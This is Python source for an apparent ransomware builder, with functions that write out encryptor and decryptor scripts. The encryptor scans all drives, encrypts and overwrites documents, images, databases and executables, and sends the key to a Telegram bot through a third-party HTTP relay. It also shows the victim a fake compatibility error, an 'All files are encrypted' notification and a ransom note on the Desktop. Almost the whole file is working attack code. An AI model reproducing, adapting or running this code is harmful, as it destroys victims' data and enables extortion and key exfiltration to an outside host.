def create_encrypt_script_file(token, chat_id, message, name):
    script = make_encrypt_script(token, chat_id, message)
    with open(f'render/{name}.py', 'w') as file:
        file.write(script)
        file.close()


def make_encrypt_script(token, chat_id, message):
    script = '''
from cryptography.fernet import Fernet
from subprocess import check_output
import os, requests
from elevate import elevate
from getpass import getuser
import ctypes
from win10toast import ToastNotifier

MB_OK = 0x0
MB_OKCXL = 0x01
MB_YESNOCXL = 0x03
MB_YESNO = 0x04
MB_HELP = 0x4000
ICON_EXLAIM = 0x30
ICON_INFO = 0x40
ICON_STOP = 0x10

# sending interface
url = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
token = %s


def encrypt_files():

    key = Fernet.generate_key()

    fernet_algorithm = Fernet(key)

    send_key_to_telegram_bot(key)

    drives = find_drives()

    formats = ['exe', 'png', 'jpg', 'jpeg', 'psd', 'py', 'js', 'ai', 'mp3', 'txt', 'mp4', 'docx', 'pkt', 'pcap', 'log',
               'ibd', 'mar', 'te', 'ddl', 'dtsx', 'gdb', 'trm', 'itw', 'teacher', 'accdc', 'itdb', 'nyf', 'pdb',
               'sqlitedb', 'mdf', 'db', 'go']

    for drive in drives:

        # first element is not drive name
        if drives.index(drive) == 0:
            continue

        drive = drive.decode()
        drive = drive.replace('\\\\', '')
        drive = drive.replace('C:', '/')

        for format in formats:
            try:
                with open('log', 'w') as error_log:

                    locations = find_location(error_log, format, drive)

                    for location in locations:
                        open_file(location, fernet_algorithm)


            except:
                pass


def open_file(location, fernet_algorithm):
    with open(location, 'rb') as file:
        write_encrypted_data(file, fernet_algorithm, location)


def encrypt_file_data(file, fernet_algorithm):
    data = file.read()
    encrypt_data = fernet_algorithm.encrypt(data)
    return encrypt_data


def write_encrypted_data(file, fernet_algorithm, location):
    encrypt_data = encrypt_file_data(file, fernet_algorithm)
    # create new file and write encrypted data in it
    new_file = open(location , 'wb')
    new_file.write(encrypt_data)
    file.close()
    new_file.close()


def find_location(error_log, format, drive):
    locations = check_output(f'{drive} dir /S /B *.{format}', shell=True, stderr=error_log)

    locations = locations.decode().replace(' ', '').split()

    return locations


def find_drives():
    drives = check_output('fsutil fsinfo drives', shell=True)

    drives = drives.split()

    return drives


def send_key_to_telegram_bot(key):
    send_message_to_telegram_bot(message=key)


def send_message_to_telegram_bot(message):
    telegram_api = f'https://api.telegram.org/bot{token}/SendMessage?chat_id=%stext={str(message)}'

    send_request(telegram_api)


def send_request(telegram_api):
    global url

    payload = {
        'UrlBox': telegram_api,
        'AgentList': 'Mozilla Firefox',
        'VersionsList': 'HTTP/1.1',
        'MethodList': 'POST'
    }

    result = requests.post(url, payload)

    return result


# show error to victim
def show_error_window():
    ctypes.windll.user32.MessageBoxA(0,
                                     b'This verison of this file is not compatible with the version of Windows you\\'re running. Check your computer\\'s system information to see whether you need an x86 (32-bit) or x64 (64-bit) verion of the program',
                                     b'Error',
                                     ICON_STOP | MB_OK)


# create a not for victim
def create_note():
    path = os.path.expanduser('~') + '\\Desktop'

    with open(path + f'\\for_{getuser()}.txt', 'w') as file:
        message = %s
        file.write(message)
        file.close()


# show notification to victim
def show_notification():
    ToastNotifier().show_toast('All files are encrypted', 'Check your Desktop we left you a note',
                               icon_path='icons/hacked.ico')


show_error_window()
encrypt_files()
show_notification()
create_note()
''' % (token, chat_id, message)
    return script


def create_decrypt_script_file(key, name):
    script = make_decrypt_script(key)
    with open(f'render/{name}.py', 'w') as file:
        file.write(script)
        file.close()


def make_decrypt_script(key: str):
    script = '''
from cryptography.fernet import Fernet
from subprocess import check_output
import os
from elevate import elevate

key = \'%s\'


def decrypt_files():
    global key
    fernet_algorithm = Fernet(key)
    drives = find_drives()

    formats = ['exe', 'png', 'jpg', 'jpeg', 'psd', 'py', 'js', 'ai', 'mp3', 'txt', 'mp4', 'docx', 'pkt', 'pcap', 'log',
               'ibd', 'mar', 'te', 'ddl', 'dtsx', 'gdb', 'trm', 'itw', 'teacher', 'accdc', 'itdb', 'nyf', 'pdb',
               'sqlitedb', 'mdf', 'db', 'go']

    for drive in drives:

        # first element is not drive name
        if drives.index(drive) == 0:
            continue

        drive = drive.decode()
        drive = drive.replace('\\\\', '')
        drive = drive.replace('C:', '/')

        for format in formats:
            try:
                with open('log', 'w') as error_log:

                    locations = find_location(error_log, format)

                    for location in locations:
                        with open(location, 'rb') as file:
                            data = file.read()
                            decrypted_data = fernet_algorithm.decrypt(data)
                            # create new file and write encrypted data in it
                            new_file = open(location, 'wb')
                            new_file.write(decrypted_data)
                            file.close()
                            new_file.close()


            except:
                pass

def find_location(error_log, format):
    locations = check_output(f'dir /S /B *.{format}', shell=True, stderr=error_log)

    locations = locations.decode().replace(' ', '').split()

    return locations


def find_drives():
    drives = check_output('fsutil fsinfo drives', shell=True)

    drives = drives.split()

    return drives
''' % str(key)

    return script
